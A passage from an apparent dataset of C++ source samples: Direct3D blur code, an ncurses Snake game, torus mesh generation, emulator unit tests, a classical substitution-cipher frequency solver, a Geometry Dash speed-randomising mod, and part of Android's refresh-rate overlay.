pSurface = nullptr;\n    pBlurFirst->GetSurfaceLevel(0U, &pSurface);\n\n    if (ComPtr<IDirect3DSurface9> backBuffer; device->GetBackBuffer(0, 0, D3DBACKBUFFER_TYPE_MONO, backBuffer.GetAddressOf()) == D3D_OK) {\n        if (ComPtr<IDirect3DSurface9> surface; pBlurFirst->GetSurfaceLevel(0, surface.GetAddressOf()) == D3D_OK)\n            device->StretchRect(backBuffer.Get(), nullptr, surface.Get(), nullptr, D3DTEXF_LINEAR);\n    }\n\n    //pDevice->StretchRect(pBackBuffer, nullptr, pSurface, nullptr, D3DTEXF_LINEAR);\n\n    pSurface->Release();\n    pBackBuffer->Release();\n\n    pDevice->SetSamplerState(0, D3DSAMP_ADDRESSU, D3DTADDRESS_WRAP);\n    pDevice->SetSamplerState(0, D3DSAMP_ADDRESSV, D3DTADDRESS_WRAP);\n    //pDevic",
    "#include \"game.h\"\n#include <iostream>\n#include <filesystem>\n#include <vector>\n#include <algorithm>\n#include <unistd.h>\n#include <ncurses.h>\n#include <getopt.h>\n\nnamespace fs = std::filesystem;\n\n/**\n * @brief Imprime a mensagem de uso do programa.\n *\n * Esta fun\u00e7\u00e3o exibe a mensagem de uso do programa, especificando os argumentos \n * que podem ser passados na linha de comando.\n */\nvoid print_usage() {\n    std::cout << \"Usage: snaze-game [--life N] [--food N]\" << std::endl;\n}\n\n/**\n * @brief Imprime a mensagem de boas-vindas do jogo.\n *\n * Esta fun\u00e7\u00e3o exibe a mensagem de boas-vindas do jogo, incluindo as op\u00e7\u00f5es de \n * simula\u00e7\u00e3o do jogo e as instru\u00e7\u00f5es para iniciar o jogo.\n */\nvoid print_welcome_message() {\n    std::cout << \"---> Welcome to the classic Snake Game <---\\n\"\n              << \"Game simulation options:\\n\"\n              << \"--lives <num> Number of lives the snake shall have. Default = 5.\\n\"\n              << \"--food <num> Number of food pellets for the entire simulation. Default = 10.\\n\"\n              << \"--------------------------------------------------\\n\"\n              << \">>> Press <ENTER> to start the game!\\n\";\n}\n\n/**\n * @brief Fun\u00e7\u00e3o principal que inicia o jogo Snake.\n *\n * Esta fun\u00e7\u00e3o configura o ambiente do jogo, processa os argumentos da linha de comando,\n * inicializa os n\u00edveis e controla o loop principal do jogo.\n *\n * @param argc N\u00famero de argumentos da linha de comando.\n * @param argv Lista de argumentos da linha de comando.\n * @return C\u00f3digo de status de execu\u00e7\u00e3o (0 para sucesso, 1 para erro).\n */\nint main(int argc, char** argv) {\n    srand(time(0));\n    std::string assetsDir = \"../assets\";\n    // Verifica se o diret\u00f3rio \"assets\" existe\n    // Se n\u00e3o existe, exibe uma mensagem de erro indicando que o diret\u00f3rio n\u00e3o foi encontrado\n    // Retorna 1 para indicar um erro durante a execu\u00e7\u00e3o do programa\n    if (!fs::exists(assetsDir)) {\n        std::cerr << \"Error: Directory 'assets' does not exist!\" << std::endl;\n        return 1;\n    }\n\n    int initialLives = 5; \n    int foodRequired = 10; \n\n    // Configura\u00e7\u00e3o das op\u00e7\u00f5es de linha de comando usando a estrutura option\n    static struct option long_options[] = {\n        {\"life\", required_argument, 0, 'l'},\n        {\"food\", required_argument, 0, 'f'},\n        {0, 0, 0, 0}\n    };\n\n    int opt;\n    int option_index = 0;\n\n    // Loop para processar as op\u00e7\u00f5es de linha de comando usando getopt_long\n    while ((opt = getopt_long(argc, argv, \"l:f:\", long_options, &option_index)) != -1) {\n        switch (opt) {\n            case 'l':\n                initialLives = std::stoi(optarg);\n                break;\n            case 'f':\n                foodRequired = std::stoi(optarg);\n                break;\n            default:\n                print_usage();\n                return 1;\n        }\n    }\n\n    print_welcome_message();\n    std::cin.get();\n\n    std::vector<std::string> levels;\n    // Itera sobre os arquivos no diret\u00f3rio especificado por assetsDir e adiciona seus caminhos ao vetor levels\n    for (const auto& entry : fs::directory_iterator(assetsDir)) {\n        levels.push_back(entry.path().string());\n    }\n\n    // Verifica se o vetor levels est\u00e1 vazio, indicando que nenhum arquivo de n\u00edvel foi encontrado no diret\u00f3rio 'assets'\n    if (levels.empty()) {\n        std::cerr << \"Error: No level files found in 'assets' directory!\" << std::endl;\n        return 1;\n    }\n\n    // Ordena os caminhos dos arquivos de n\u00edvel armazenados no vetor levels em ordem lexicogr\u00e1fica\n    std::sort(levels.begin(), levels.end());\n\n    initscr();\n    noecho();\n    cbreak();\n    timeout(0); // Configura o getch() para n\u00e3o esperar por input\n\n    GameState state;\n    const int delay = 200000; // 200ms\n    bool allLevelsCompleted = true; // Flag para verificar se todos os n\u00edveis foram completados\n\n    // Itera sobre cada n\u00edvel carregado e inicia o jogo\n    for (const auto& level : levels) {\n        state = initializeGame(level);\n        if (state.gameOver) {\n            continue;\n        }\n        state.lives = initialLives;\n        state.foodCounter = 0; \n\n        while (!state.gameOver) {\n            renderGame(state, foodRequired); \n            usleep(delay); \n            state.direction = getNextDirection(state);\n            bool foodConsumed = updateGame(state);\n\n            if (foodConsumed && state.foodCounter >= foodRequired) {\n                mvprintw(state.height + 2, 0, \"Food consumed! Level completed! Press ENTER to move to the next level...\");\n                refresh();\n                while (getch() != '\\n') {}\n                break; // Passa para o pr\u00f3ximo n\u00edvel\n            }\n\n            if (state.lives <= 0) {\n                mvprintw(state.height + 2, 0, \"Game Over! Press ENTER to exit.\");\n                refresh();\n                while (getch() != '\\n') {}\n                usleep(2000000); \n                allLevelsCompleted = false; \n                break;\n            }\n        }\n    }\n\n    // Verifica se todos os n\u00edveis foram completados e se ainda h\u00e1 vidas restantes\n",
    "#include \"Torus.h\"\nusing namespace std;\n\nTorus::Torus() {\n    init(0.5f, 0.2f, 48);\n}\n\nTorus::Torus(float innerRadius, float outerRadius, int prec) {\n    init(innerRadius, outerRadius, prec);\n}\n\nfloat Torus::toRadians(float degrees) {\n    return (degrees) * 2.0f * 3.1415926f / 360.0f;\n}\n\nvoid Torus::init(float innerRadius, float outerRadius, int prec) {\n    inner = innerRadius;\n    outer = outerRadius;\n    numVertices = (prec + 1) * (prec + 1);\n    numIndices = prec * prec * 6;\n\n    for (int i = 0; i < numVertices; i++) { vertices.emplace_back(); }\n    for (int i = 0; i < numVertices; i++) { textCoords.emplace_back(); }\n    for (int i = 0; i < numVertices; i++) { normals.emplace_back(); }\n    for (int i = 0; i < numVertices; i++) { sTangents.emplace_back(); }\n    for (int i = 0; i < numVertices; i++) { tTangents.emplace_back(); }\n    for (int i = 0; i < numIndices; i++) { indices.emplace_back(); }\n\n    // calculate first ring\n    for (int i = 0; i < prec + 1; i++) {\n        float amt = toRadians(i*360.0f / prec);\n\n        glm::mat4 rMat = glm::rotate(glm::mat4(1.0f), amt, glm::vec3(0.0f, 0.0f, 1.0f));\n        glm::vec3 initPos(rMat * glm::vec4(0.0f, outer, 0.0f, 1.0f));\n\n        vertices[i] = glm::vec3(initPos + glm::vec3(inner, 0.0f, 0.0f));\n        textCoords[i] = glm::vec2(0.0f, ((float)i / (float)prec));\n\n        rMat = glm::rotate(glm::mat4(1.0f), amt + (3.14159f / 2.0f), glm::vec3(0.0f, 0.0f, 1.0f));\n        tTangents[i] = glm::vec3(rMat * glm::vec4(0.0f, -1.0f, 0.0f, 1.0f));\n\n        sTangents[i] = glm::vec3(glm::vec3(0.0f, 0.0f, -1.0f));\n        normals[i] = glm::cross(tTangents[i], sTangents[i]);\n    }\n    // rotate the first ring about Y to get the other rings\n    for (int ring = 1; ring < prec + 1; ring++) {\n        for (int i = 0; i < prec + 1; i++) {\n            float amt = (float)toRadians((float)ring * 360.0f / (prec));\n\n            glm::mat4 rMat = glm::rotate(glm::mat4(1.0f), amt, glm::vec3(0.0f, 1.0f, 0.0f));\n            vertices[ring*(prec + 1) + i] = glm::vec3(rMat * glm::vec4(vertices[i], 1.0f));\n\n            textCoords[ring*(prec + 1) + i] = glm::vec2((float)ring*2.0f / (float)prec, textCoords[i].t);\n\n            rMat = glm::rotate(glm::mat4(1.0f), amt, glm::vec3(0.0f, 1.0f, 0.0f));\n            sTangents[ring*(prec + 1) + i] = glm::vec3(rMat * glm::vec4(sTangents[i], 1.0f));\n\n            rMat = glm::rotate(glm::mat4(1.0f), amt, glm::vec3(0.0f, 1.0f, 0.0f));\n            tTangents[ring*(prec + 1) + i] = glm::vec3(rMat * glm::vec4(tTangents[i], 1.0f));\n\n            rMat = glm::rotate(glm::mat4(1.0f), amt, glm::vec3(0.0f, 1.0f, 0.0f));\n            normals[ring*(prec + 1) + i] = glm::vec3(rMat * glm::vec4(normals[i], 1.0f));\n        }\n    }\n    // calculate triangle indices\n    for (int ring = 0; ring < prec; ring++) {\n        for (int i = 0; i < prec; i++) {\n            indices[((ring*prec + i) * 2) * 3 + 0] = ring*(prec + 1) + i;\n            indices[((ring*prec + i) * 2) * 3 + 1] = (ring + 1)*(prec + 1) + i;\n            indices[((ring*prec + i) * 2) * 3 + 2] = ring*(prec + 1) + i + 1;\n            indices[((ring*prec + i) * 2 + 1) * 3 + 0] = ring*(prec + 1) + i + 1;\n            indices[((ring*prec + i) * 2 + 1) * 3 + 1] = (ring + 1)*(prec + 1) + i;\n            indices[((ring*prec + i) * 2 + 1) * 3 + 2] = (ring + 1)*(prec + 1) + i + 1;\n        }\n    }\n\n}\n\nint Torus::getNumVertices() {return numVertices;}\nint Torus::getNumIndices() {return numIndices;}\nstd::vector<int> Torus::getIndices() {return indices;}\nstd::vector<glm::vec3> Torus::getVertices() {return vertices;}\nstd::vector<glm::vec2> Torus::getTextCoords() {return textCoords;}\nstd::vector<glm::vec3> Torus::getNormals() {return normals;}\n",
    "#include \"Archimedes/MemcTest.h\"\n\nclass VideoControllerTest: public MemcTest {\npublic:\n    VideoControllerTest() : MemcTest(0u) {}\n    ~VideoControllerTest() override = default;\n};\n\nTEST_F(VideoControllerTest, VideoControllerIsAccessibleInSupervisorMode) {\n    ASSERT_TRUE(WriteWordMemcControl({\n        .operatingSystemMode = MEMC_OS_MODE_DISABLE,\n        .soundDmaControl = MEMC_SOUND_DMA_DISABLE,\n        .videoDmaControl = MEMC_VIDEO_DMA_DISABLE,\n        .dramRefreshControl = MEMC_DRAM_REFRESH_NONE_0,\n        .highRomAccessTime = MEMC_HIGH_ROM_ACCESS_450,\n        .lowRomAccessTime = MEMC_LOW_ROM_ACCESS_450,\n        .logicalPageSize = MEMC_PAGE_SIZE_4K\n    }));\n    EXPECT_CALL(mediator, WriteWordVidcRegister(0xDDCCEEAAu));\n    EXPECT_TRUE(WriteWordVideoController(0u, 0xDDCCEEAAu));\n}\n\nTEST_F(VideoControllerTest, VideoControllerIsNotAccessibleInOperatingSystemMode) {\n    ASSERT_TRUE(WriteWordMemcControl({\n        .operatingSystemMode = MEMC_OS_MODE_ENABLE,\n        .soundDmaControl = MEMC_SOUND_DMA_DISABLE,\n        .videoDmaControl = MEMC_VIDEO_DMA_DISABLE,\n        .dramRefreshControl = MEMC_DRAM_REFRESH_NONE_0,\n        .highRomAccessTime = MEMC_HIGH_ROM_ACCESS_450,\n        .lowRomAccessTime = MEMC_LOW_ROM_ACCESS_450,\n        .logicalPageSize = MEMC_PAGE_SIZE_4K\n    }));\n    SetSupervisor(false);\n    EXPECT_CALL(mediator, WriteWordVidcRegister)\n        .Times(0u);\n    EXPECT_FALSE(WriteWordVideoController(0u, 0xDDCCEEAAu));\n}\n\nTEST_F(VideoControllerTest, VideoControllerIsNotAccessibleInUserModeMode) {\n    ASSERT_TRUE(WriteWordMemcControl({\n        .operatingSystemMode = MEMC_OS_MODE_DISABLE,\n        .soundDmaControl = MEMC_SOUND_DMA_DISABLE,\n        .videoDmaControl = MEMC_VIDEO_DMA_DISABLE,\n        .dramRefreshControl = MEMC_DRAM_REFRESH_NONE_0,\n        .highRomAccessTime = MEMC_HIGH_ROM_ACCESS_450,\n        .lowRomAccessTime = MEMC_LOW_ROM_ACCESS_450,\n        .logicalPageSize = MEMC_PAGE_SIZE_4K\n    }));\n    SetSupervisor(false);\n    EXPECT_CALL(mediator, WriteWordVidcRegister)\n        .Times(0u);\n    EXPECT_FALSE(WriteWordVideoController(0u, 0xDDCCEEAAu));\n}\n\nTEST_F(VideoControllerTest, VideoControllerIsAccessibleInSupervisorModeWithByteAccess) {\n    ASSERT_TRUE(WriteWordMemcControl({\n        .operatingSystemMode = MEMC_OS_MODE_DISABLE,\n        .soundDmaControl = MEMC_SOUND_DMA_DISABLE,\n        .videoDmaControl = MEMC_VIDEO_DMA_DISABLE,\n        .dramRefreshControl = MEMC_DRAM_REFRESH_NONE_0,\n        .highRomAccessTime = MEMC_HIGH_ROM_ACCESS_450,\n        .lowRomAccessTime = MEMC_LOW_ROM_ACCESS_450,\n        .logicalPageSize = MEMC_PAGE_SIZE_4K\n    }));\n    EXPECT_CALL(mediator, WriteWordVidcRegister(0xCDCDCDCDu));\n    EXPECT_TRUE(WriteByteVideoController(0u, 0xCDu));\n}",
    "\ufeff#include <iostream>\r\n#include <string>\r\n#include <map>\r\n#include <vector>\r\n#include <algorithm>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\n// \u6309\u7167\u9012\u51cf\u987a\u5e8f\u6392\u5e8f\r\nbool compare(pair<char, int> a, pair<char, int> b) {\r\n\treturn a.second > b.second;\r\n}\r\n\r\nint main() {\r\n\tstring text = \"UZ QSO VUOHXMOPV GPOZPEVSG ZWSZ OPFPESX UDBMETSX AIZ VUEPHZ HMDZSHZO WSFP APPD TSVP QUZW YMXUZUHSX EPYEPOPDZSZUFPO MB ZWP FUPZ HMDJ UD TMOHMQ\";\r\n\r\n\t// \u7edf\u8ba1\u5bc6\u6587\u6587\u672c\u4e2d\u5404\u5b57\u6bcd\u7684\u51fa\u73b0\u9891\u7387\r\n\tmap<char, int> frequencyMap;\r\n\tfor (char c : text) {\r\n\t\tif (isalpha(c)) {\r\n\t\t\tfrequencyMap[c]++;\r\n\t\t}\r\n\t}\r\n\t\r\n\t// \u5c06\u9891\u7387\u7edf\u8ba1\u7ed3\u679c\u5b58\u5165vector\u4e2d\uff0c\u4ee5\u4fbf\u6392\u5e8f\r\n\tvector<pair<char, int>> frequencyVector(frequencyMap.begin(), frequencyMap.end());\r\n\r\n\t// \u6309\u7167\u9891\u7387\u7684\u9012\u51cf\u987a\u5e8f\u6392\u5e8f\r\n\tsort(frequencyVector.begin(), frequencyVector.end(), compare);\r\n\r\n\tint totalCharacters = 0; // \u603b\u5b57\u7b26\u6570\r\n\tfor (auto character : frequencyVector) {\r\n\t\ttotalCharacters += character.second;\r\n\t}\r\n\r\n\t// \u8f93\u51fa\u7ed3\u679c\r\n\tcout << left << setw(10) << \"\u5bc6\u6587\u5b57\u6bcd\" << setw(10) << \"\u51fa\u73b0\u6b21\u6570\" << \"\u51fa\u73b0\u9891\u7387\" << endl;\r\n\tcout << fixed << setprecision(2);\r\n\tfor (auto character : frequencyVector) {\r\n\t\tdouble frequencyPercentage = (static_cast<double>(character.second) / totalCharacters) * 100.0;\r\n\t\tcout << left << setw(10) << character.first << setw(10) << character.second << frequencyPercentage << \"%\" << endl;\r\n\t}\r\n\tcout << endl;\r\n\r\n\tchar mapping_alpha[26] = { ' ' };\r\n\tmapping_alpha[frequencyVector[0].first - 'A'] = 'e';  // \u6781\u9ad8\u9891\r\n\tmapping_alpha[frequencyVector[1].first - 'A'] = 't';  // \u6b21\u9ad8\u9891\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == frequencyVector[0].first) {\r\n\t\t\ttext[i] = 'e';\r\n\t\t}\r\n\t\telse if (text[i] == frequencyVector[1].first) {\r\n\t\t\ttext[i] = 't';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdP\u66ff\u6362\u4e3ae\uff0c\u5b57\u6bcdZ\u66ff\u6362\u4e3at\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['W' - 'A'] = 'h';  // the\r\n\tmapping_alpha['S' - 'A'] = 'a';  // that\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'W') {\r\n\t\t\ttext[i] = 'h';\r\n\t\t}\r\n\t\telse if (text[i] == 'S') {\r\n\t\t\ttext[i] = 'a';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdW\u66ff\u6362\u4e3ah\uff0c\u5b57\u6bcdS\u66ff\u6362\u4e3aa\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['F' - 'A'] = 'v';  // have\r\n\tmapping_alpha['U' - 'A'] = 'i';  // it\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'F') {\r\n\t\t\ttext[i] = 'v';\r\n\t\t}\r\n\t\tif (text[i] == 'U') {\r\n\t\t\ttext[i] = 'i';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdF\u66ff\u6362\u4e3av\uff0c\u5b57\u6bcdU\u66ff\u6362\u4e3ai\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['Q' - 'A'] = 'w';  // with\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'Q') {\r\n\t\t\ttext[i] = 'w';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdQ\u66ff\u6362\u4e3aw\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['O' - 'A'] = 's';  // was\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'O') {\r\n\t\t\ttext[i] = 's';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdO\u66ff\u6362\u4e3as\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['E' - 'A'] = 'r';  // several\r\n\tmapping_alpha['X' - 'A'] = 'l';  // several\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'E') {\r\n\t\t\ttext[i] = 'r';\r\n\t\t}\r\n\t\tif (text[i] == 'X') {\r\n\t\t\ttext[i] = 'l';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdE\u66ff\u6362\u4e3ar\uff0c\u5b57\u6bcdX\u66ff\u6362\u4e3al\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['Y' - 'A'] = 'p';  // representative\r\n\tmapping_alpha['D' - 'A'] = 'n';  // representative\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'Y') {\r\n\t\t\ttext[i] = 'p';\r\n\t\t}\r\n\t\tif (text[i] == 'D') {\r\n\t\t\ttext[i] = 'n';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdY\u66ff\u6362\u4e3ap\uff0c\u5b57\u6bcdD\u66ff\u6362\u4e3an\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['V' - 'A'] = 'd';  // direct\r\n\tmapping_alpha['H' - 'A'] = 'c';  // direct\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'V') {\r\n\t\t\ttext[i] = 'd';\r\n\t\t}\r\n\t\tif (text[i] == 'H') {\r\n\t\t\ttext[i] = 'c';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdV\u66ff\u6362\u4e3ad\uff0c\u5b57\u6bcdH\u66ff\u6362\u4e3ac\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['G' - 'A'] = 'y';  // yesterday\r\n\tmapping_alpha['M' - 'A'] = 'o';  // contacts  political\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'G') {\r\n\t\t\ttext[i] = 'y';\r\n\t\t}\r\n\t\tif (text[i] == 'M') {\r\n\t\t\ttext[i] = 'o';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdG\u66ff\u6362\u4e3ay\uff0c\u5b57\u6bcdM\u66ff\u6362\u4e3ao\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['A' - 'A'] = 'b';  // been\r\n\tmapping_alpha['B' - 'A'] = 'f';  // of\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'A') {\r\n\t\t\ttext[i] = 'b';\r\n\t\t}\r\n\t\tif (text[i] == 'B') {\r\n\t\t\ttext[i] = 'f';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdA\u66ff\u6362\u4e3ab\uff0c\u5b57\u6bcdB\u66ff\u6362\u4e3af\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['T' - 'A'] = 'm';  // informal\r\n\tmapping_alpha['I' - 'A'] = 'u';  // but\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'T') {\r\n\t\t\ttext[i] = 'm';\r\n\t\t}\r\n\t\tif (text[i] == 'I') {\r\n\t\t\ttext[i] = 'u';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdT\u66ff\u6362\u4e3am\uff0c\u5b57\u6bcdI\u66ff\u6362\u4e3au\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout << endl;\r\n\r\n\tmapping_alpha['J' - 'A'] = 'g';  // cong\r\n\tfor (int i = 0; i < text.size(); i++) {\r\n\t\tif (text[i] == 'J') {\r\n\t\t\ttext[i] = 'g';\r\n\t\t}\r\n\t}\r\n\tcout << \"\u5c06\u5bc6\u6587\u4e2d\u5b57\u6bcdJ\u66ff\u6362\u4e3ag\uff0c\u66ff\u6362\u540e\u7684\u5bc6\u6587\uff1a\" << endl;\r\n\tcout << text << endl;\r\n\tcout <<",
    "#include <Geode/Geode.hpp>\n\n#include <cstdlib>\n#include <chrono>\n#include <math.h>\n\nusing namespace geode::prelude;\nusing namespace std::chrono;\n\n#include <Geode/modify/MenuLayer.hpp>\n#include <Geode/modify/CCScheduler.hpp>\n#include <Geode/modify/CCKeyboardDispatcher.hpp>\n#include <Geode/loader/SettingEvent.hpp>\n#include <Geode/modify/FMODAudioEngine.hpp>\n\nbool enable = true;\nbool audio = true;\nbool onclick = false;\n\nfloat currSpeed = 2;\n\ndouble lower = 0.5;\ndouble upper = 1.5;\n\ndouble rate = 1;\n\n$execute {\n\tlistenForSettingChanges(\"lower-bound\", +[](double value) {\n\t\tlower = value;\n\t});\n\tlistenForSettingChanges(\"upper-bound\", +[](double value) {\n\t\tupper = value;\n\t});\n\tlistenForSettingChanges(\"onclick\", +[](bool value) {\n\t\tonclick = value;\n\t});\n\tlistenForSettingChanges(\"enable\", +[](bool value) {\n\t\tenable = value;\n\t});\n\tlistenForSettingChanges(\"audio\", +[](bool value) {\n\t\taudio = value;\n\t});\n\tlistenForSettingChanges(\"rate\", +[](double value) {\n\t\trate = value;\n\t});\n\tenable = Mod::get()->getSettingValue<bool>(\"enable\");\n\taudio = Mod::get()->getSettingValue<bool>(\"audio\");\n\tonclick = Mod::get()->getSettingValue<bool>(\"onclick\");\n\tlower = Mod::get()->getSettingValue<double>(\"lower-bound\");\n\tupper = Mod::get()->getSettingValue<double>(\"upper-bound\");\n\trate = Mod::get()->getSettingValue<double>(\"rate\");\n}\n\nclass $modify(CCScheduler) {\n\tvoid update(float x) {\n\t\tauto time = high_resolution_clock::now();\n\t\tif (duration_cast<milliseconds>(time.time_since_epoch()).count() % (int)floor(rate * 1000.f) == 0 && !onclick) {\n\t\t\tcurrSpeed = ((float)rand() / (float)RAND_MAX) * (upper - lower) + lower;\n\t\t\tauto fmod = FMODAudioEngine::sharedEngine();\n\t\t}\n\n\t\tif (enable) {\n\t\t\tx *= currSpeed;\n\t\t}\n\t\t\n\t\tCCScheduler::update(x);\n\t}\n};\n\nclass $modify(CCKeyboardDispatcher) {\n\tbool dispatchKeyboardMSG(cocos2d::enumKeyCodes key, bool a, bool b) {\n\t\tif (!enable) return CCKeyboardDispatcher::dispatchKeyboardMSG(key, a, b);\n\t\tif (onclick) {\n\t\t\tcurrSpeed = ((float)rand() / (float)RAND_MAX) * (upper - lower) + lower;\n\t\t}\n\n\t\treturn CCKeyboardDispatcher::dispatchKeyboardMSG(key, a, b);\n\t}\n};\n\nclass $modify(FMODAudioEngine) {\n\tvoid update(float delta) {\n\t\tFMODAudioEngine::update(delta);\n\n\t\tfloat speed = currSpeed;\n\n\t\tif (!enable || !audio) speed = 1;\n\n\t\tauto fmod = FMODAudioEngine::sharedEngine();\n\t\tFMOD_RESULT result;\n\t\tFMOD::ChannelGroup* master_group = nullptr;\n\t\tresult = fmod->m_system->getMasterChannelGroup(&master_group);\n\t\tif (result == FMOD_OK) {\n\t\t\tmaster_group->setPitch(speed);\n\t\t}\n\t\tfmod->m_globalChannel->setPitch(speed);\n\t}\n};",
    "/*\n * Copyright 2019 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <algorithm>\n\n//#include \"BackgroundExecutor.h\"\n//#include \"Client.h\"\n//#include \"Layer.h\"\n#include \"RefreshRateOverlay.h\"\n\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wconversion\"\n#include <SkCanvas.h>\n#include <SkPaint.h>\n#pragma clang diagnostic pop\n#include <SkBlendMode.h>\n#include <SkRect.h>\n#include <SkSurface.h>\n#include <gui/SurfaceControl.h>\n\n#undef LOG_TAG\n#define LOG_TAG \"RefreshRateOverlay\"\n\nnamespace android {\nnamespace {\n\nconstexpr int kDigitWidth = 64;\nconstexpr int kDigitHeight = 100;\nconstexpr int kDigitSpace = 16;\n\nconstexpr int kMaxDigits = /*displayFps*/ 3 + /*renderFps*/ 3 + /*spinner*/ 1;\nconstexpr int kBufferWidth = kMaxDigits * kDigitWidth + (kMaxDigits - 1) * kDigitSpace;\nconstexpr int kBufferHeight = kDigitHeight;\n\n} // namespace\n\nSurfaceControlHolder::~SurfaceControlHolder() {\n    // Hand the sp<SurfaceControl> to the helper thread to release the last\n    // reference. This makes sure that the SurfaceControl is destructed without\n    // SurfaceFlinger::mStateLock held.\n    //BackgroundExecutor::getInstance().sendCallbacks(\n    //        {[sc = std::move(mSurfaceControl)]() mutable { sc.clear(); }});\n}\n\nvoid RefreshRateOverlay::SevenSegmentDrawer::drawSegment(Segment segment, int left, SkColor color,\n                                                         SkCanvas& canvas) {\n    const SkRect rect = [&]() {\n        switch (segment) {\n            case Segment::Upper:\n                return SkRect::MakeLTRB(left, 0, left + kDigitWidth, kDigitSpace);\n            case Segment::UpperLeft:\n                return SkRect::MakeLTRB(left, 0, left + kDigitSpace, kDigitHeight / 2);\n            case Segment::UpperRight:\n                return SkRect::MakeLTRB(left + kDigitWidth - kDigitSpace, 0, left + kDigitWidth,\n                                        kDigitHeight / 2);\n            case Segment::Middle:\n                return SkRect::MakeLTRB(left, kDigitHeight / 2 - kDigitSpace / 2,\n                                        left + kDigitWidth, kDigitHeight / 2 + kDigitSpace / 2);\n            case Segment::LowerLeft:\n                return SkRect::MakeLTRB(left, kDigitHeight / 2, left + kDigitSpace, kDigitHeight);\n            case Segment::LowerRight:\n                return SkRect::MakeLTRB(left + kDigitWidth - kDigitSpace, kDigitHeight / 2,\n                                        left + kDigitWidth, kDigitHeight);\n            case Segment::Bottom:\n                return SkRect::MakeLTRB(left, kDigitHeight - kDigitSpace, left + kDigitWidth,\n                                        kDigitHeight);\n        }\n    }();\n\n    SkPaint paint;\n    paint.setColor(color);\n    paint.setBlendMode(SkBlendMode::kSrc);\n    canvas.drawRect(rect, paint);\n}\n\nvoid RefreshRateOverlay::SevenSegmentDrawer::drawDigit(int digit, int left, SkColor color,\n                                                       SkCanvas& canvas) {\n    if (digit < 0 || digit > 9) return;\n\n    if (digit == 0 || digit == 2 || digit == 3 || digit == 5 || digit == 6 || digit == 7 ||\n        digit == 8 || digit == 9)\n        drawSegment(Segment::Upper, left, color, canvas);\n    if (digit == 0 || digit == 4 || digit == 5 || digit == 6 || digit == 8 || digit == 9)\n        drawSegment(Segment::UpperLeft, left, color, canvas);\n    if (digit == 0 || digit == 1 || 